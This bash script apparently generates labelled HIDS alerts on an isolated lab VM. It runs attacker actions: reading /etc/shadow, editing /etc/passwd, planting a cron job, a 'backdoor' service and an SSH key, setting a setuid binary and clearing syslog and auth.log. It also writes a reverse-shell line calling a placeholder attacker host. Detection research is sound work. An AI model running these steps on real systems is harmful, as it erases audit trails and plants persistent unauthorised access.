#!/bin/bash
# =====================================================================
# ATTACK SIMULATION SCRIPT — CONTROLLED LAB USE ONLY
# Part of NICS project G1140705 sub-project 4 (IDS -> CTI Kill-Chain).
# Purpose: generate labelled IDS/HIDS alerts on an ISOLATED testbed VM.
# Network addresses and credentials are placeholders (<TARGET_IP>,
# <ATTACKER_IP>, <TARGET_PASSWORD>) — set them for your own lab.
# Destructive artefacts have been neutralised; lines marked NEUTRALIZED
# show what the original simulation wrote. Do NOT run outside a
# disposable virtual machine.
# =====================================================================


# Create timestamped log file
LOG_FILE="/tmp/attack_simulation_batch2_$(date +'%Y%m%d_%H%M%S').log"

log_action() {
    echo "$(date +'%Y-%m-%d %H:%M:%S') - $1" | tee -a "$LOG_FILE"
}

log_action "🚀 Starting Batch 2: 45 HIDS attack simulations"

# 1-3: User management
log_action "➤ Creating and deleting users"
sudo useradd pentester01
sudo passwd -d pentester01
sudo userdel pentester01

# 4-6: Password & shadow access
log_action "➤ Accessing /etc/shadow and modifying /etc/passwd"
sudo cat /etc/shadow > /dev/null
echo "malicious" | sudo tee -a /etc/passwd > /dev/null
sudo sed -i '$ d' /etc/passwd

# 7-9: Cronjob manipulation
log_action "➤ Adding and removing cronjob"
echo "* * * * * root echo Hacked > /tmp/crontest" | sudo tee /etc/cron.d/testcron
sudo rm /etc/cron.d/testcron

# 10-12: chmod & file perm abuse
sudo touch /tmp/rootfile
sudo chmod 777 /tmp/rootfile
sudo chown root:root /tmp/rootfile

# 13-15: Archiving data
sudo tar -czf /tmp/etc_archive.tar.gz /etc/group
sudo zip /tmp/secret.zip /etc/hosts > /dev/null
sudo cp /tmp/etc_archive.tar.gz /home/agent/etc.tar.gz

# 16-17: bashrc tampering
echo "alias cd='rm -rf *'" | tee -a /tmp/bashrc_tamper.sample > /dev/null   # NEUTRALIZED: was ~/.bashrc
echo "export PATH=.:$PATH" >> /tmp/bashrc_tamper.sample   # NEUTRALIZED: was ~/.bashrc

# 18-19: Fake .desktop file
echo '[Desktop Entry]' > ~/Downloads/fake.desktop
echo 'Exec=echo SIMULATED-MALICIOUS-PAYLOAD' >> ~/Downloads/fake.desktop   # NEUTRALIZED: was 'Exec=rm -rf /'

# 20-22: log tampering
sudo bash -c '> /var/log/syslog'
sudo bash -c '> /var/log/auth.log'
sudo bash -c '> /var/log/dpkg.log'

# 23: Malicious reverse shell string
echo "nc -e /bin/sh attacker_ip 4444" | sudo tee /tmp/rev.txt > /dev/null

# 24: Add SSH key
mkdir -p ~/.ssh
echo "ssh-rsa AAAA... attacker@vm" >> ~/.ssh/authorized_keys

# 25-26: Change hostname and timezone
sudo hostname attacker-host
sudo timedatectl set-timezone UTC

# 27: Load fake module (simulated)
sudo modprobe -n e1000

# 28-30: Touch known malware filenames
sudo touch /tmp/malware.exe
sudo touch /tmp/trojandropper.sh
sudo touch /tmp/keylogger.py

# 31: Create systemd .service file
echo -e "[Unit]\nDescription=Bad Service\n[Service]\nExecStart=/bin/echo pwned\n[Install]\nWantedBy=multi-user.target" | sudo tee /etc/systemd/system/backdoor.service

# 32: Start/stop service
sudo systemctl daemon-reexec
sudo systemctl stop ssh
sudo systemctl start ssh

# 33-35: Run suspicious tools (simulation)
which curl
which nc
which nmap || echo "nmap not found"

# 36-37: Dangerous alias
echo "alias ls='rm -rf *'" >> /tmp/bashrc_tamper.sample   # NEUTRALIZED: was ~/.bashrc
echo "alias ps='killall -9'" >> /tmp/bashrc_tamper.sample   # NEUTRALIZED: was ~/.bashrc

# 38-39: Suspect binaries
cp /bin/ls /tmp/hiddenls
chmod u+s /tmp/hiddenls

# 40-41: EICAR malware file
echo 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' | sudo tee /tmp/eicar2.com > /dev/null
chmod 755 /tmp/eicar2.com

# 42-43: SSH logins (simulated)
sudo grep 'sshd' /var/log/auth.log > /dev/null
sudo grep 'Accepted password' /var/log/auth.log > /dev/null

# 44-45: Fake su log + bash shell opened
sudo su -c 'echo su - root >> /tmp/sulog'
bash -c 'echo shell opened' > /dev/null

log_action "✅ Batch 2 Simulation Completed — log: $LOG_FILE"
echo "✅ Done! Check: $LOG_FILE"
